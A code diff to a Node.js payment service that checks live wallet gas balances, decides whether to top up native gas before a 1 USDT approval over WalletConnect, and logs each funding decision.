@@ -11,6 +11,66 @@ const { refreshBalances } = require("./balances");
 const { autoTopupRaw, hasNativeFunder, publicTopup, tronMinRaw } = require("../config/evmGas");
 const logger = require("../utils/logger");
 
+function parseRaw(value) {
+    if (value == null || value === "") {
+        return null;
+    }
+
+    try {
+        return BigInt(String(value));
+    } catch (_err) {
+        return null;
+    }
+}
+
+function pickWalletGas(liveRaw, sessionRaw) {
+    const live = parseRaw(liveRaw);
+    const session = parseRaw(sessionRaw);
+
+    if (live == null) {
+        return session;
+    }
+
+    if (live === 0n && session != null && session > 0n) {
+        return session;
+    }
+
+    return live;
+}
+
+function needsGasFunding(gas) {
+    if (!gas) {
+        return false;
+    }
+
+    if (gas.needFunding === true) {
+        return true;
+    }
+
+    if (gas.needFunding === false) {
+        return false;
+    }
+
+    const walletGas = parseRaw(gas.currentBalanceRaw);
+    const requiredGas = parseRaw(gas.estimatedRequiredRaw);
+
+    if (walletGas == null || requiredGas == null) {
+        return false;
+    }
+
+    return walletGas < requiredGas;
+}
+
+function logFundingDecision(network, gas, extra = {}) {
+    logger.info({
+        network,
+        walletGas: gas?.currentBalanceRaw ?? null,
+        requiredGas: gas?.estimatedRequiredRaw ?? null,
+        needFunding: needsGasFunding(gas),
+        ...extra
+    }, "Gas funding decision");
+}
+
 function publicPayment(payment) {
     return require("./paymentService").publicPayment(payment);
 }
@@ -121,7 +181,7 @@ async function checkGasSufficiency(session, networkKey, deps = {}) {
 
     const configured = autoTopupRaw(network);
     const recommended = configured || recommendedFromEstimate(estimate.estimatedNativeCost);
-    const balance = estimate.nativeBalance != null ? BigInt(estimate.nativeBalance) : null;
+    const sessionRaw = nativeBalanceRaw != null && nativeBalanceRaw !== "" ? nativeBalanceRaw : null;
     let required = BigInt(estimate.estimatedNativeCost);
 
     if (network.key === "tron") {
@@ -131,14 +191,24 @@ async function checkGasSufficiency(session, networkKey, deps = {}) {
         }
     }
 
-    const sufficient = balance != null && balance >= required;
+    const walletGas = pickWalletGas(estimate.nativeBalance, sessionRaw);
+    const needFunding = walletGas != null && walletGas < required;
+    const sufficient = walletGas != null && walletGas >= required;
+
+    logger.info({
+        network: network.key,
+        walletGas: walletGas != null ? walletGas.toString() : null,
+        requiredGas: required.toString(),
+        needFunding
+    }, "Gas funding decision");
 
     return {
         sufficient,
+        needFunding,
         network: network.key,
         nativeSymbol: network.nativeSymbol,
-        currentBalance: formatUnits(estimate.nativeBalance || "0", network.nativeDecimals),
-        currentBalanceRaw: estimate.nativeBalance,
+        currentBalance: walletGas != null ? formatUnits(walletGas.toString(), network.nativeDecimals) : null,
+        currentBalanceRaw: walletGas != null ? walletGas.toString() : null,
         estimatedGas: estimate.estimatedGas,
         estimatedRequired: formatUnits(required.toString(), network.nativeDecimals),
         estimatedRequiredRaw: required.toString(),
@@ -148,7 +218,7 @@ async function checkGasSufficiency(session, networkKey, deps = {}) {
         funderReady: hasNativeFunder(network.key),
         reason: sufficient
             ? "Live native balance covers the 1 USDT approval gas."
-            : balance == null
+            : walletGas == null
                 ? `Could not confirm live ${network.nativeSymbol} on ${network.name}. Approve stays hidden until the wallet balance is verified.`
                 : `Your ${network.name} wallet has insufficient ${network.nativeSymbol} to complete the 1 USDT card authorization.`
     };
@@ -208,6 +278,34 @@ async function confirmGasQuote(paymentId, body = {}, deps = {}) {
         throw new ValidationError("Create a gas quote before confirming funding");
     }
 
+    const session = sessionStore.getSession(payment.connectionId);
+
+    if (!session) {
+        throw new NotFoundError("WalletConnect session not found");
+    }
+
+    const live = await (deps.checkGasSufficiency || checkGasSufficiency)(session, payment.network, deps);
+    logFundingDecision(payment.network, live, { paymentId, stage: "confirmGasQuote" });
+    paymentStore.updatePayment(paymentId, {
+        gasQuote: live,
+        gasSufficient: live.sufficient === true
+    });
+
+    if (!needsGasFunding(live)) {
+        const ready = paymentStore.updatePayment(paymentId, {
+            gasSufficient: live.sufficient === true,
+            status: live.sufficient ? (payment.status === "awaiting_gas" ? "created" : payment.status) : payment.status
+        });
+        return {
+            confirmed: true,
+            funded: false,
+            message: live.sufficient
+                ? "Gas is already sufficient. Continue to the 1 USDT approval."
+                : "Native gas could not be compared yet. Funding is skipped until walletGas and requiredGas are both known.",
+            payment: publicPayment(ready)
+        };
+    }
+
     if (payment.gasFundingTxHash) {
         return {
             confirmed: true,
@@ -215,14 +313,8 @@ async function confirmGasQuote(paymentId, body = {}, deps = {}) {
             alreadyFunded: true,
             transactionHash: payment.gasFundingTxHash,
             message: "Native gas was already sent for this wallet. Waiting for the balance to confirm.",
-            payment: publicPayment(payment)
+            payment: publicPayment(paymentStore.getPayment(paymentId))
         };
-    }
-
-    const session = sessionStore.getSession(payment.connectionId);
-
-    if (!session) {
-        throw new NotFoundError("WalletConnect session not found");
     }
 
     if (session.nativeFunding?.[payment.network]?.hash) {
@@ -260,15 +352,6 @@ async function confirmGasQuote(paymentId, body = {}, deps = {}) {
 
     const network = getNetwork(payment.network, { requireContracts: false });
 
-    if (payment.gasQuote.sufficient) {
-        return {
-            confirmed: true,
-            funded: false,
-            message: "Gas is already sufficient. Continue to the 1 USDT approval.",
-            payment: publicPayment(paymentStore.getPayment(paymentId))
-        };
-    }
-
     if (!hasNativeFunder(network.key) || !autoTopupRaw(network)) {
         return {
             confirmed: true,
@@ -305,25 +388,25 @@ async function confirmGasQuote(paymentId, body = {}, deps = {}) {
     };
     sessionStore.updateSession(payment.connectionId, { nativeFunding: funding });
 
-    let live = null;
+    let afterFund = null;
     try {
         if (!deps.sendNative) {
             await refreshBalances(payment.connectionId, deps);
         }
         const latest = sessionStore.getSession(payment.connectionId) || session;
-        live = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, network.key, deps);
+        afterFund = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, network.key, deps);
     } catch (err) {
         logger.warn({ err: { message: err.message }, paymentId }, "Could not re-check gas after top-up");
     }
 
-    const ready = Boolean((live && live.sufficient === true) || sent?.hash);
+    const ready = Boolean(afterFund && afterFund.sufficient === true);
     const updated = paymentStore.updatePayment(paymentId, {
         gasFundingConfirmed: true,
         gasFundingVerified: Boolean(sent?.hash),
         gasFundingTxHash: sent.hash,
         gasSufficient: ready,
-        gasQuote: live || payment.gasQuote,
-        status: "created"
+        gasQuote: afterFund || live,
+        status: ready ? "created" : "awaiting_gas"
     });
 
     if (ready) {
@@ -414,6 +497,7 @@ async function verifyGasFunding(paymentId, body = {}, deps = {}) {
 
 module.exports = {
     checkGasSufficiency,
+    needsGasFunding,
     recommendedFromEstimate,
     createGasQuote,
     confirmGasQuote,
